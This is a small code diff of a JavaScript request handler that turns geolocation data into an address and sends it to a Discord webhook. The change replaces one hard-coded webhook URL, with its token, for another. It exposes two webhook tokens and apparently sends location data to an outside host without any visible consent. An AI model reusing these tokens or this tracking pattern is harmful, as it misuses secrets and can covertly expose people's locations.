@@ -10,7 +10,7 @@ export default async function handler(req, res) {
             const geoData = await geoRes.json();
             const address = geoData.display_name || 'Tidak diketahui';
 
-            const discordWebhookUrl = "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1"; // Ganti dengan Webhook Discord Anda
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1563198219284906116/bTgAtzBPWpJ3T8laDTu-SUC0pppBkUV7ceFDUHedGpo74toylxKkkwFCKPk6czvT8HXA"; // Ganti dengan Webhook Discord Anda
 
             if (discordWebhookUrl && discordWebhookUrl !== "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1") {
                 const message = {
